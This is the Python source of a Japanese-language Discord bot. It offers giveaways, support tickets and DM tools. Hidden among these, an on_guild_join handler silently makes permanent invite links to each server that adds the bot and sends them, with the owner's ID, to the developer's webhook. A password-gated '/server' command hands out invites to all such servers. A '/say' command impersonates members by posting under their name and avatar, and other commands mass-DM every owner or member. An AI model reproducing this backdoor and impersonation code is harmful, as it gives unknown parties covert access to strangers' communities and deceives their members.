import discord
from discord.ext import commands
from discord import app_commands
import os
import requests
import random
import datetime
import asyncio
import aiohttp



# Botの設定
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True  # メンバー情報の取得に必要
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
ADMIN_PASSWORD = "ぱすわーど"  # giveawayの履歴を送信するパスワード
SECRET_PASSWORD = 'ぱすわーど' # botを使っているオーナーにアナウンスを送るときにつかうパスワード
WEBHOOK_URL = "うぇぶふっく"   # サーバーに参加したときに送信するwebhook

class GiveawayButton(discord.ui.View):
    def __init__(self, end_time, prize, content, winners_count):
        super().__init__(timeout=None)  # タイムアウトを明示的に管理
        self.participants = []
        self.prize = prize
        self.content = content
        self.winners_count = winners_count
        self.end_time = end_time
        self.message = None  # メッセージを格納するための変数

    async def start_timer(self):
        # 現在時刻と終了時刻の差を計算し、タイマーを設定
        now = datetime.datetime.now()
        remaining_time = (self.end_time - now).total_seconds()
        await asyncio.sleep(remaining_time)
        await self.on_timeout()

    @discord.ui.button(label="参加", style=discord.ButtonStyle.primary)
    async def enter_giveaway(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in self.participants:
            self.participants.append(interaction.user.id)
            await interaction.response.send_message(f"{interaction.user.name} さんが参加しました！", ephemeral=True)
            
            # メッセージを編集して参加人数を更新
            if self.message:
                await self.message.edit(content=f"🎉 「{self.prize}」の抽選を開始します！ボタンを押して参加してください。\n現在の参加人数: {len(self.participants)} 🎉\n抽選終了時刻: {self.end_time.strftime('%H時%M分%S秒までです！')}")
        else:
            await interaction.response.send_message("既に参加しています！", ephemeral=True)

    async def on_timeout(self):
        if self.participants:
            winners = random.sample(self.participants, min(self.winners_count, len(self.participants)))
            winner_mentions = ', '.join(f"<@{winner_id}>" for winner_id in winners)
            await self.message.channel.send(f"🎉 おめでとうございます！ {winner_mentions} さんが「{self.prize}」の勝者です！ 🎉")
            
            # 当選者にDMを送信
            for winner_id in winners:
                winner = await bot.fetch_user(winner_id)
                try:
                    await winner.send(f"おめでとうございます！\nあなたが「{self.prize}」の抽選に当選しました！\n\n内容: {self.content}")
                except discord.Forbidden:
                    await self.message.channel.send(f"{winner.name} さんにDMを送れませんでした。")
        else:
            await self.message.channel.send("誰も参加しませんでした。")


class TicketView(discord.ui.View):
    def __init__(self, role: discord.Role, category: discord.CategoryChannel, log_channel: discord.TextChannel):
        super().__init__(timeout=None)
        self.role = role
        self.category = category
        self.log_channel = log_channel

    @discord.ui.button(label="チケットを作成", style=discord.ButtonStyle.green, custom_id="create_ticket")
    async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild

        # チケットチャンネル名を定義
        channel_name = f"ticket-{interaction.user.name}"

        # 同名のチャンネルが既に存在しているか確認
        existing_channel = discord.utils.get(self.category.channels, name=channel_name)
        if existing_channel:
            await interaction.response.send_message("既にチケットが存在します！", ephemeral=True)
            return

        # チャンネルを作成
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),  # デフォルトでは非公開
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),  # 作成者にアクセスを許可
            self.role: discord.PermissionOverwrite(view_channel=True, send_messages=True)  # 指定ロールにアクセスを許可
        }

        channel = await self.category.create_text_channel(name=channel_name, overwrites=overwrites)

        await interaction.response.send_message(f"チケットチャンネル {channel.mention} を作成しました！", ephemeral=True)

        # チャンネルに初期メッセージを送信
        delete_view = DeleteTicketView(channel, self.log_channel, interaction.user)
        await channel.send(
            f"{self.role.mention} チケットが作成されました。\n{interaction.user.mention} がこのチケットを作成しました。\n"
            f"解決したら以下のボタンを押してチャンネルを削除してください。",
            view=delete_view
        )

        # ログチャンネルに通知を送信
        await self.log_channel.send(f"チケットチャンネル {channel.mention} が作成されました。\n作成者: {interaction.user.mention}")


class DeleteTicketView(discord.ui.View):
    def __init__(self, channel: discord.TextChannel, log_channel: discord.TextChannel, ticket_creator: discord.Member):
        super().__init__(timeout=None)
        self.channel = channel
        self.log_channel = log_channel
        self.ticket_creator = ticket_creator

    @discord.ui.button(label="チケットを削除", style=discord.ButtonStyle.red, custom_id="delete_ticket")
    async def delete_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        # チケットのメッセージをファイルに保存
        transcript_file = f"{self.channel.name}_transcript.txt"
        with open(transcript_file, "w", encoding="utf-8") as file:
            async for message in self.channel.history(oldest_first=True):
                timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
                file.write(f"[{timestamp}] {message.author}: {message.content}\n")

        # ログチャンネルにファイルを送信
        timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
        await self.log_channel.send(
            f" {timestamp} チケットチャンネル {self.channel.name} が削除されました。\n削除者: {interaction.user.mention}",
            file=discord.File(transcript_file)
        )

        # チケット作成者にDMを送信
        try:
            timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
            await self.ticket_creator.send(
                f"{timestamp}あなたのチケットチャンネル `{self.channel.name}` が削除されました。\n以下がチケットの記録です。",
                file=discord.File(transcript_file)
            )
        except discord.Forbidden:
            await self.log_channel.send(f"チケット作成者 {self.ticket_creator.mention} へのDM送信に失敗しました。")

        # 一時ファイルを削除
        os.remove(transcript_file)

        # チャンネル削除
        await self.channel.delete(reason=f"チケット削除 by {interaction.user}")


@bot.tree.command(name="ticket", description="チケットを作成するボタンを送信します")
@app_commands.describe(
    role="チケットにアクセスできるロール",
    category="チケットチャンネルを作成するカテゴリー",
    log_channel="チケットのログを送信するチャンネル",
    title="埋め込みメッセージのタイトル（省略可能）",
    description="埋め込みメッセージの説明（省略可能）"
)
async def ticket(
    interaction: discord.Interaction,
    role: discord.Role,
    category: discord.CategoryChannel,
    log_channel: discord.TextChannel,
    title: str = "チケット発行",
    description: str = "チケットを発行する場合は下のボタンを押してください"
):
    # Embedの作成
    embed = discord.Embed(
        title=title,
        description=description,
        color=discord.Color.blue()
    )

    # ボタン付きのメッセージを送信
    view = TicketView(role=role, category=category, log_channel=log_channel)
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="say", description="他人になりすませれます")
async def say(interaction: discord.Interaction, user: discord.Member, message: str):
    """
    指定したチャンネルにウェブフックを作成して、そのウェブフックを使い
    指定されたユーザー風の名前とアイコンでメッセージを送信する
    """
    try:
        # 実行されたチャンネル
        channel = interaction.channel

        # チャンネルにWebhookを作成
        webhook = await channel.create_webhook(name=f"{user.display_name}'s webhook")

        # ユーザーの名前とアバターURLを取得
        username = user.display_name
        avatar_url = user.avatar.url if user.avatar else user.default_avatar.url

        # Webhookでメッセージを送信
        await webhook.send(
            content=message,  # メッセージ内容
            username=username,  # Webhookの名前をユーザー名に設定
            avatar_url=avatar_url  # Webhookのアイコンをユーザーのアイコンに設定
        )

        # Webhookを削除
        await webhook.delete()

        # 完了メッセージを送信
        await interaction.response.send_message("送信に成功", ephemeral=True)

    except Exception as e:
        # エラーハンドリング
        await interaction.response.send_message(f"エラーが発生しました: {str(e)}",ephemeral=True)
        #await channel.send(f"エラーが発生しました: {str(e)}",ephemeral=True)

@bot.tree.command(name="announce", description="Botを導入しているサーバーのオーナーにお知らせを送信します")
@app_commands.describe(
    password="管理者のみが知るパスワード",
    message="サーバーオーナーに送るメッセージ"
)
async def announce(interaction: discord.Interaction, password: str, message: str):
    # ✅ パスワードチェック
    if password != SECRET_PASSWORD:
        await interaction.response.send_message("❌ パスワードが間違っています。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)  # インタラクションの有効期限を延長

    success_count = 0
    failed_count = 0

    # ✅ Botが参加しているすべてのサーバーのオーナーにDMを送信
    for guild in bot.guilds:
        owner = guild.owner  # サーバーオーナーを取得
        if owner:
            try:
                embed = discord.Embed(
                    title="📢 重要なお知らせ",
                    description=message,
                    color=discord.Color.gold()
                )
                embed.set_footer(text=f"送信元: {interaction.guild.name}")

                await owner.send(embed=embed)
                success_count += 1
            except discord.Forbidden:
                failed_count += 1  # DM送信が拒否された場合

    # ✅ 実行者に結果を報告
    await interaction.followup.send(f"✅ {success_count} 件のサーバーオーナーにお知らせを送信しました。\n❌ {failed_count} 件のオーナーには送信できませんでした。", ephemeral=True)

@bot.tree.command(name="server", description="Botが参加しているサーバー情報を取得します")
@app_commands.describe(password="管理者のみが知るパスワード")
async def server(interaction: discord.Interaction, password: str):
    # ✅ パスワードチェック
    if password != SECRET_PASSWORD:
        await interaction.response.send_message("❌ パスワードが間違っています。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)  # インタラクションの有効期限を延長

    server_info_list = []
    
    for guild in bot.guilds:
        owner = guild.owner  # サーバーオーナーを取得
        invite_link = "作成不可"  # 初期値
        
        try:
            # ✅ Botが「招待を作成」権限を持っている場合のみ、招待リンクを作成
            if guild.me.guild_permissions.create_instant_invite:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                invite_link = invite.url
        except Exception:
            pass  # 何らかの理由で招待リンクを取得できない場合は無視

        # ✅ サーバー情報をリストに追加
        server_info_list.append(f"📌 **サーバー名:** {guild.name}\n👑 **オーナー:** {owner}\n🔗 **招待リンク:** {invite_link}\n")

    # ✅ 実行者にDMで送信
    server_info_text = "\n".join(server_info_list)
    
    try:
        await interaction.user.send(f"📋 **Botが参加しているサーバー情報**\n\n{server_info_text}")
        await interaction.followup.send("📩 サーバー情報をDMに送信しました。", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("⚠️ DMの送信に失敗しました。DMを受け取れるように設定してください。", ephemeral=True)

@bot.tree.command(name="message_count", description="指定したチャンネルのメッセージ数をカウントします")
@app_commands.describe(
    channel="メッセージ数をカウントするチャンネル（指定しない場合は現在のチャンネル）",
    public="結果を全員に見せるかどうか"
)
async def message_count(interaction: discord.Interaction, channel: discord.TextChannel = None, public: bool = False):
    # 遅延応答を送信（「処理中です」というメッセージを表示）
    await interaction.response.defer(ephemeral=not public)

    # チャンネルが指定されていない場合は、コマンドを実行したチャンネルを使用
    target_channel = channel or interaction.channel

    # メッセージ数をカウント
    count = 0
    async for _ in target_channel.history(limit=None):
        count += 1

    # 結果を送信
    message = f"{target_channel.mention} のメッセージ数は {count} 件です。"
    await interaction.followup.send(message, ephemeral=not public)



@bot.tree.command(name="giveaway", description="抽選を開始します")
@discord.app_commands.describe(
    景品="景品を入力してください",
    制限時間="制限時間を分単位で入力してください",
    内容="DMに送る内容を入力してください",
    人数="当選者の人数を入力してください"
)
@discord.app_commands.checks.has_permissions(administrator=True)
async def giveaway(interaction: discord.Interaction, 景品: str, 制限時間: int, 内容: str, 人数: int):
    """抽選を開始します。"""
    await interaction.response.defer()
    
    # 分を秒に変換して終了時刻を計算
    end_time = datetime.datetime.now() + datetime.timedelta(minutes=制限時間)

    # 履歴をテキストファイルに書き込む
    with open("giveaway_history.txt", "a", encoding="utf-8") as file:
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"{now} - 景品: {景品}, 内容: {内容}\n")
    
    view = GiveawayButton(end_time=end_time, prize=景品, content=内容, winners_count=人数)
    view.message = await interaction.followup.send(
        f"🎉 「{景品}」の抽選を開始します！ボタンを押して参加してください。\n現在の参加人数: 0 🎉\n抽選終了時刻: {end_time.strftime('%H時%M分%S秒までです！')}",
        view=view
    )
    
    # タイマーを開始
    bot.loop.create_task(view.start_timer())

@giveaway.error
async def giveaway_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    if isinstance(error, discord.app_commands.MissingPermissions):
        await interaction.response.send_message("管理者だけが実行できます。", ephemeral=True)
    else:
        await interaction.response.send_message("エラーが発生しました。", ephemeral=True)

@bot.tree.command(name="develop", description="開発者専用コマンドで履歴を送信")
@discord.app_commands.checks.has_permissions(administrator=True)
async def develop(interaction: discord.Interaction, パスワード: str):
    """開発者専用コマンド"""
    if パスワード == ADMIN_PASSWORD:
        try:
            # giveaway_history.txtを開いてDMで送信
            with open("giveaway_history.txt", "r", encoding="utf-8") as file:
                history_content = file.read()

            # DMで送信
            await interaction.user.send(f"Giveaway 履歴:\n{history_content}")
            await interaction.response.send_message("履歴をDMに送信しました！", ephemeral=True)

        except FileNotFoundError:
            await interaction.response.send_message("履歴ファイルが見つかりませんでした。", ephemeral=True)

    else:
        await interaction.response.send_message("パスワードが間違っています。", ephemeral=True)

@develop.error
async def develop_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    if isinstance(error, discord.app_commands.MissingPermissions):
        await interaction.response.send_message("管理者だけが実行できます。", ephemeral=True)
    else:
        await interaction.response.send_message("エラーが発生しました。", ephemeral=True)
@bot.tree.command(name="senddm", description="指定したユーザーにDMを送信します")
@discord.app_commands.describe(
    user="DMを送信するユーザーを指定してください",
    message="送信するメッセージを入力してください"
)
@discord.app_commands.checks.has_permissions(administrator=True)
async def send_dm(interaction: discord.Interaction, user: discord.User, message: str):
    """指定したユーザーに商品配達をします。"""
    try:
        embed = discord.Embed(
            title="商品配達のおしらせ",
            description=message,
            color=discord.Color.blue())  # 色の設定
        await user.send(embed=embed)
        await interaction.response.send_message(f"{user.name} さんにメッセージを送信しました。", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("指定したユーザーにDMを送れませんでした。", ephemeral=True)

@send_dm.error
async def send_dm_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    if isinstance(error, discord.app_commands.MissingPermissions):
        await interaction.response.send_message("管理者だけが実行できます。", ephemeral=True)
    else:
        await interaction.response.send_message("エラーが発生しました。", ephemeral=True)

def is_admin(interaction: discord.Interaction) -> bool:
    return interaction.user.guild_permissions.administrator

async def send_dm(member: discord.Member, embed: discord.Embed, queue: asyncio.Queue):
    """ メンバーにDMを送信し、結果をqueueに追加する（並列処理用） """
    if not member.bot:
        try:
            await member.send(embed=embed)
            await queue.put(("success", member))
        except discord.Forbidden:
            await queue.put(("fail", member))

@bot.tree.command(name="news", description="サーバーの全メンバーにニュースをDMで送信します（管理者限定）")
@app_commands.describe(title="ニュースのタイトル", description="ニュースの説明")
async def news(interaction: discord.Interaction, title: str, description: str):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("❌ あなたはこのコマンドを実行する権限がありません。", ephemeral=True)
        return

    guild = interaction.guild
    if not guild:
        await interaction.response.send_message("サーバー内でのみ使用可能です。", ephemeral=True)
        return

    embed = discord.Embed(title=title, description=description, color=discord.Color.blue())
    embed.set_footer(text=f"送信元: {guild.name}")

    response_message = await interaction.response.send_message("⌛ ニュースの送信を開始しています...\n✅ 送信成功: 0人\n❌ 送信失敗: 0人", ephemeral=False)

    queue = asyncio.Queue()
    tasks = []

    for member in guild.members:
        tasks.append(send_dm(member, embed, queue))

    # 並列処理で全員にDMを送る（同時に50人程度を処理）
    CHUNK_SIZE = 50  # 一度に並列処理する数
    sent_count = 0
    failed_count = 0

    # 進捗表示用のタスク
    async def update_progress():
        nonlocal sent_count, failed_count
        while True:
            try:
                result, _ = await queue.get()
                if result == "success":
                    sent_count += 1
                else:
                    failed_count += 1
                if sent_count + failed_count == len(tasks):
                    break
                #await response_message.edit(content=f"⌛ ニュースの送信中...\n✅ 送信成功: {sent_count}人\n❌ 送信失敗: {failed_count}人")
            except:
                break

    progress_task = asyncio.create_task(update_progress())

    # 50人ずつ並列処理
    for i in range(0, len(tasks), CHUNK_SIZE):
        await asyncio.gather(*tasks[i:i + CHUNK_SIZE])

    await progress_task  # 進捗更新タスクを終了

    # 最終結果を表示
    await response_message.edit(content=f"✅ **ニュースの送信が完了しました！**\n✅ 送信成功: {sent_count}人\n❌ 送信失敗: {failed_count}人")


# Botの起動
@bot.event
async def on_ready():
    print(f"ログインしました：{bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"スラッシュコマンドを {len(synced)} 個同期しました")
    except Exception as e:
        print(f"スラッシュコマンドの同期に失敗しました: {e}")
@bot.event
async def on_guild_join(guild):
    # サーバー名、オーナー、招待リンクを取得
    server_name = guild.name
    server_owner = guild.owner
    invite_link = await create_invite(guild)

    # Webhookに送信するメッセージを作成
    message = (
        f"Botが新しいサーバーに参加しました！\n"
        f"**サーバー名**: {server_name}\n"
        f"**サーバーオーナー**: {server_owner} ({server_owner.id})\n"
        f"**招待リンク**: {invite_link}"
    )

    # Webhookにメッセージを送信
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
        await webhook.send(message)

async def create_invite(guild):
    # 招待リンクを作成
    try:
        # テキストチャンネルを探す
        channel = guild.text_channels[0]  # 最初のテキストチャンネルを使用
        invite = await channel.create_invite(max_age=0, max_uses=0)  # 無期限・無制限の招待リンク
        return invite.url
    except Exception as e:
        print(f"招待リンクの作成に失敗しました: {e}")
        return "招待リンクを作成できませんでした"

bot.run("とーくん")
